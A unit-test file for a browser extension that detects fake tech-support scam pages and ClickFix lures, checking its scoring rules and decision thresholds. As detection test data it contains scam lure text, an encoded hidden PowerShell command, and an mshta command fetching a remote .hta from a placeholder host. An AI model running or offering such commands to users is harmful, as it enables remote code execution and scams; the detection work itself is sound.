// Unit tests for the pure scoring logic. Run: npm test  (node --test)
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);
const S = require('../extension/content/signals.js');

const hitsOf = (text, visual) => S.scoreContent(text, visual).hits;

test('content: the provided malicious sample scores far above threshold', () => {
  const text = `Windows Security Alert Your computer has been locked Unusual activity has been detected on this device.
    Do not restart or shut down your computer. Call Microsoft Support immediately: 1-800-555-0199 Error Code: 0x800704cf`;
  const r = S.scoreContent(text, { systemColor: true });
  assert.deepEqual(r.hits.sort(), ['fakeErrorCode', 'lockWording', 'supportPhone', 'systemColor', 'urgency', 'vendorImpersonation'].sort());
  assert.ok(r.score >= 8);
});

test('content: the provided benign report scores zero', () => {
  const r = S.scoreContent('Monthly Report Generated on: Wed Oct 14 2026 Item Value Sessions 1,204 Conversions 87', { systemColor: false });
  assert.equal(r.score, 0);
});

test('content: lock wording rule', () => {
  for (const s of ['Your computer has been locked', 'Your Mac has been blocked due to suspicious activity',
    'Your PC is infected', 'This device has been compromised', 'Your browser has been hacked']) {
    assert.ok(hitsOf(s).includes('lockWording'), s);
  }
  // near misses: the verb before the noun, or no lock state at all
  for (const s of ['I locked my computer keys in the car', 'Blocked pop-ups on this computer', 'computer science lecture notes']) {
    assert.ok(!hitsOf(s).includes('lockWording'), s);
  }
});

test('content: vendor impersonation rule', () => {
  for (const s of ['Call Microsoft Support', 'Windows Defender alert', 'Apple Security notice', 'Contact Norton help desk']) {
    assert.ok(hitsOf(s).includes('vendorImpersonation'), s);
  }
  for (const s of ['I use Microsoft Word daily', 'Apple pie recipe']) {
    assert.ok(!hitsOf(s).includes('vendorImpersonation'), s);
  }
});

test('content: phone rule covers formats and obfuscation', () => {
  for (const s of ['1-800-555-0199', '1 (844) 555-0123', '+1 (888) 555-0142', '888.555.0100', '+44 20 3769 0199',
    '１‑８００‑５５５‑０１９９' /* fullwidth + nb-hyphens */]) {
    assert.ok(hitsOf(s).includes('supportPhone'), s);
  }
  for (const s of ['Sessions 1,204', 'Invoice 2026-10-14', 'Order #1001 €42.00']) {
    assert.ok(!hitsOf(s).includes('supportPhone'), s);
  }
});

test('content: zero-width characters do not hide keywords', () => {
  const r = S.scoreContent('Your c​omputer has been l​ocked. Call Mi​crosoft Supp​ort');
  assert.ok(r.hits.includes('lockWording'));
  assert.ok(r.hits.includes('vendorImpersonation'));
});

test('content: system colour only corroborates, never scores alone', () => {
  assert.equal(S.scoreContent('Q3 Review', { systemColor: true }).score, 0);
});

test('traps: weights', () => {
  assert.equal(S.scoreTraps({}).score, 0);
  assert.equal(S.scoreTraps({ escapeKeys: true }).score, 3);
  assert.equal(S.scoreTraps({ escapeKeys: true, beforeunload: true, contextmenu: true }).score, 6);
  assert.equal(S.scoreTraps({ historyFlood: true, beforeunload: true }).score, 4);
  assert.equal(S.scoreTraps({ lockApis: true, escapeKeys: true }).score, 6);
});

test('context: same-tab script redirect scores, user-opened tab never does', () => {
  assert.equal(S.scoreContext({ scriptRedirect: true }).score, 2);
  assert.equal(S.scoreContext({ scriptRedirect: true, fast: true }).score, 3);
  assert.equal(S.scoreContext({ scriptRedirect: true, userOpenedTab: true }).score, 0);
  assert.equal(S.scoreContext(null).score, 0);
});

test('decide: exact boundaries', () => {
  const cases = [
    [{ A: 0, B: 3, C: 4 }, 'SCAM'],   // content + traps
    [{ A: 2, B: 0, C: 4 }, 'SCAM'],   // content + no-gesture same-tab redirect
    [{ A: 0, B: 2, C: 4 }, 'CLEAN'],  // content alone (article about scams)
    [{ A: 1, B: 2, C: 9 }, 'CLEAN'],
    [{ A: 0, B: 3, C: 3 }, 'CLEAN'],  // traps + weak content
    [{ A: 2, B: 5, C: 0 }, 'CLEAN'],  // editor with unsaved-changes guard
    [{ A: 0, B: 6, C: 3 }, 'WARN'],   // heavy trapping, unreadable content
    [{ A: 0, B: 6, C: 4 }, 'SCAM'],
    [{ A: 3, B: 0, C: 0 }, 'CLEAN'],  // same-tab export with no scam content
  ];
  for (const [input, expected] of cases) assert.equal(S.decide(input), expected, JSON.stringify(input));
});

test('clickfix: fake CAPTCHA with hidden obfuscated PowerShell', () => {
  const r = S.scoreClickFix('powershell -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAB0AGUAcwB0AA==',
    "Verify you are human I'm not a robot Press Windows Key + R Press Ctrl + V Press Enter");
  assert.equal(r.clickfix, true);
  assert.ok(r.hits.includes('hiddenPayload') && r.hits.includes('obfuscated'));
});

test('clickfix: "fix the error" lure with mshta', () => {
  const r = S.scoreClickFix('mshta https://example.invalid/repair.hta',
    'This document failed to load. To fix the error, open PowerShell and paste (Ctrl+V) the repair command.');
  assert.equal(r.clickfix, true);
});

test('clickfix: docs page with a visible install command is NOT ClickFix', () => {
  const cmd = 'curl -fsSL https://example.com/acme/install.sh | sh';
  const r = S.scoreClickFix(cmd, `Install the Acme CLI. Paste this command in your terminal: ${cmd} Copy`);
  assert.equal(r.clickfix, false);
});

test('clickfix: non-command payloads are ignored', () => {
  assert.equal(S.scoreClickFix('https://example.com/share/abc123', 'Press Win+R and paste').clickfix, false);
  assert.equal(S.scoreClickFix('AB-4821', 'Verify you are human').clickfix, false);
});
